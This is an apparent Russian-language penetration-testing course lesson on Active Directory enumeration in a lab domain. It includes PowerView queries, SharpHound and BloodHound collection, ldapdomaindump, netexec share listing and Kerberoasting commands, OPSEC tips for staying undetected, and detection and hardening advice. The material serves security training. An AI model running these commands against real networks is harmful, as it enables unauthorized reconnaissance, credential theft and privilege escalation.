# 11.1 — Enumeration: PowerView, BloodHound

> **M11 · Этап 2 · 5 ч · 🟡 · артефакт:** `labs/m11-ad-attacks/l01-enum/`

## Цель

Превратить домен из «чёрного ящика» в граф: пользователи, группы, компьютеры, GPO, ACL, сессии, доверия — и найти короткие пути к цели.

## Результат

- BloodHound-граф домена `lab.local`.
- 5+ значимых находок с путями.
- Список запросов, которые вы будете повторять.

## Теория

### 1. Что собираем

- Пользователи, группы, их членство, `adminCount`, `servicePrincipalName`.
- Компьютеры, OU, кто где залогинен.
- ACL: `GenericAll`, `GenericWrite`, `WriteDACL`, `WriteOwner`, `ForceChangePassword`, `AddMember`.
- GPO и кто может их менять.
- Доверия и сайты.
- Сессии — кто на каком хосте.

### 2. Инструменты

| Инструмент | Назначение |
|---|---|
| `PowerView.ps1` | точечные запросы из PowerShell |
| `BloodHound` + `SharpHound` | сбор и визуализация графа |
| `ldapsearch`/`ldapdomaindump` | кроссплатформенно, без агента |
| `netexec` (`nxc`) | быстрые проверки и SMB |
| `ADExplorer` | ручной просмотр |

### 3. Ключевые запросы PowerView

```powershell
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
Get-DomainUser -PreauthNotRequired | select samaccountname
Get-DomainGroup -AdminCount | select samaccountname
Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner" }
Find-LocalAdminAccess
Find-DomainUserLocation
```

### 4. BloodHound

SharpHound собирает JSON. Коллекторы: `Default`, `All`, `DCOnly`, `Session`, `ACL`. В большой сети `Session` шумный и долгий — начинайте с `DCOnly` + `ACL`, потом добавляйте сессии точечно.

Ключевые встроенные запросы:

- Shortest Paths to Domain Admins.
- Kerberoastable Users.
- AS-REP Roastable Users.
- Unconstrained Delegation.
- ACL Edges.

### 5. OPSEC сбора

- `SharpHound` создаёт файлы и обращения к LDAP; в зрелой среде это видно.
- `-Stealth` снижает частоту, но не устраняет следы.
- LDAP-запросы менее шумны, чем SMB-сессии.
- Не запускайте сбор с хоста, который вам ещё нужен для тихой работы.

## Лаборатория

> `DC01` + `WIN01` в `lab.local`. Атакующий — Arch (`10.10.10.50`). Домен из M05.

### 1. Базовый контекст

```bash
nxc ldap 10.10.10.10 -u alice -p 'Password123!' --users --groups
```

Ожидаемо: список пользователей и групп. Зафиксируйте сервисные аккаунты.

### 2. LDAP без агента

```bash
ldapdomaindump -u 'lab.local\alice' -p 'Password123!' 10.10.10.10
```

Ожидаемо: HTML/JSON-дамп домена в текущем каталоге.

### 3. SharpHound

```powershell
# на WIN01, из C:\lab
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod DCOnly,ACL -OutputDirectory C:\lab\bh
```

Ожидаемо: zip с JSON. Перенесите на Linux, распакуйте.

### 4. BloodHound

```bash
sudo neo4j start
bloodhound --no-sandbox
```

Загрузите zip. Затем:

1. Отметьте `alice` как owned.
2. Найдите «Shortest Paths to Domain Admins».
3. Изучите рёбра `GenericAll`, `WriteDACL`, `MemberOf`.
4. Сохраните 3 пути скриншотами.

Ожидаемо: минимум один путь длиной ≤ 4 шага.

### 5. Точечные проверки

```bash
nxc smb 10.10.10.0/24 -u alice -p 'Password123!' --shares
nxc ldap 10.10.10.10 -u alice -p 'Password123!' --kerberoasting kerb.txt
```

Ожидаемо: доступные шары и список Kerberoastable-аккаунтов.

### 6. Карта

Составьте таблицу:

| Объект | Тип | Почему интересен | Путь |
|---|---|---|---|

## Атака и защита

- **Атака:** сбор → поиск короткого пути → эксплуатация ACL/SPN.
- **Детект:** 4661/4662 (доступ к объектам AD), аномальные LDAP-запросы, SharpHound-файлы, массовые SMB-сессии.
- **Фикс:** tiered admin, минимальные ACL, запрет `AdminCount`-мусора, мониторинг BloodHound-паттернов, LAPS, Cleanup старых SPN.

## Самопроверка

- [ ] Чем `DCOnly` отличается от `All`?
- [ ] Что означает ребро `GenericAll` на пользователе?
- [ ] Почему `AdminCount=1` — красный флаг?
- [ ] Как найти Kerberoastable-аккаунты без BloodHound?
- [ ] Какие LDAP-запросы выдают сбор?

## Дальше

[11.2 — Kerberos-атаки](l02-kerberos-attacks.md)
